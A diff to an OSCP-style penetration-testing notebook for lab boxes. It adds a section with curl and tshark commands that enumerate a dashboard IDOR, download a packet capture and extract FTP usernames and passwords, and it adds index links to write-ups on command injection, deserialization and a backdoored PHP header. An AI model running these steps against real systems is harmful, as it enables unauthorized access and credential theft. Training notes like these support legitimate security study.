@@ -588,6 +588,37 @@ See [[09. Common Web Application Attacks#9.5.2. IDOR (Insecure Direct Object Ref
 
 #### Tags: #IDOR #InsecureDirectObjectReference #MassEnumeration #EncodedReferences #APIEnumeration #IDORChain
 
+### Dashboard capture IDOR to private PCAP analysis
+
+When a custom dashboard uses a predictable object ID, compare adjacent records and follow any download link only after recording the response differences. Save the original capture and all authentication-bearing output under private loot.
+
+~~~bash
+curl -sS -D "$BoxDir/loot/data-0.headers" -o "$BoxDir/loot/data-0.html" \
+  "http://$BoxIP/data/0"
+curl -sS -D "$BoxDir/loot/data-1.headers" -o "$BoxDir/loot/data-1.html" \
+  "http://$BoxIP/data/1"
+wc -c "$BoxDir/loot/data-0.html" "$BoxDir/loot/data-1.html"
+
+curl -sS -D "$BoxDir/loot/download-0.headers" \
+  -o "$BoxDir/loot/capture-0.pcap" "http://$BoxIP/download/0"
+file "$BoxDir/loot/capture-0.pcap"
+capinfos "$BoxDir/loot/capture-0.pcap"
+
+tshark -r "$BoxDir/loot/capture-0.pcap" -q -z io,phs \
+  | tee "$BoxDir/loot/capture-0.protocols.txt"
+tshark -r "$BoxDir/loot/capture-0.pcap" \
+  -Y 'ftp.request.command == "USER" || ftp.request.command == "PASS"' \
+  -T fields -e ftp.request.command -e ftp.request.arg \
+  > "$BoxDir/loot/capture-0.ftp-auth.raw"
+chmod 600 "$BoxDir/loot/capture-0.ftp-auth.raw"
+~~~
+
+The response status alone is not proof of IDOR: compare body content, length, redirects, and linked artifacts. A live FTP denial is independent of FTP authentication visible inside a saved capture. Route recovered credentials to one evidence-based SSH or service validation, never a broad spray.
+
+See [[09. Common Web Application Attacks#9.5.2. IDOR (Insecure Direct Object Reference)|IDOR]], [[OSCP/RUNBOOK V2/Linux - IDOR and PCAP Credential Recovery|Linux - IDOR and PCAP Credential Recovery]], and [[OSCP/BOXES/WRITE UPS/Linux/Cap|Cap]].
+
+#### Tags: #IDOR #PCAP #Tshark #PacketAnalysis #CredentialRecovery #PasswordReuse
+
 ---
 
 ## XXE — XML External Entity Injection
@@ -887,6 +918,11 @@ This page turns one repeatable part of an authorized assessment into a checklist
 - [[OSCP/BOXES/WRITE UPS/Linux/TartarSauce|TartarSauce]] -- robots/Gobuster triage, aggressive WPScan plugin discovery, and Gwolle RFI validation
 - [[OSCP/BOXES/WRITE UPS/Linux/DevOops|DevOops]] -- multipart XML XXE, source-driven Python pickle proof, SSH-key extraction, and Git-history credential hunting
 - [[OSCP/BOXES/WRITE UPS/Linux/Mirai|Mirai]] -- Pi-hole fingerprinting, `/admin/` discovery, exposed web metadata, and controlled IoT credential validation
+- [[OSCP/BOXES/WRITE UPS/Linux/Cap|Cap]] -- dashboard IDOR chained into downloadable-PCAP credential recovery
+- [[OSCP/BOXES/WRITE UPS/Windows/MarkUp|MarkUp]] -- Windows XXE file read followed by SSH-key extraction
+- [[OSCP/BOXES/WRITE UPS/Windows/Optimum|Optimum]] -- HFS 2.3 command injection and callback staging
+- [[OSCP/BOXES/WRITE UPS/Linux/Management|Management]] -- OpenAM JATO deserialization after application and version enumeration
+- [[OSCP/BOXES/WRITE UPS/Linux/Pelican|Pelican]] -- unauthenticated Exhibitor configuration command injection and callback delivery
 - [[OSCP/BOXES/WRITE UPS/Linux/Blocky|Blocky]] -- WordPress REST disclosure, plugin JAR analysis, and slow-response timing triage
 - [[OSCP/BOXES/WRITE UPS/Windows/Love|Love]] -- staging virtual-host routing, URL-scanner SSRF to loopback, and authenticated Voting System upload
 
@@ -969,6 +1005,6 @@ curl --max-time 10 -fsS \
   "http://$BoxIP:$WebPort/" >/dev/null
 ```
 
-`zerodiumsystem()` is evaluated by the compromised PHP build. Treat the header as a command-execution primitive, not as a normal application parameter, and move to [[RUNBOOK V2/Linux - RCE to Shell|Linux - RCE to Shell]] after the identity proof.
+`zerodiumsystem()` is evaluated by the compromised PHP build. Treat the header as a command-execution primitive, not as a normal application parameter, and move to [[OSCP/RUNBOOK V2/Linux - RCE to Shell|Linux - RCE to Shell]] after the identity proof.
 
 **Seen in:** [[OSCP/BOXES/WRITE UPS/Linux/Knife|Knife]].
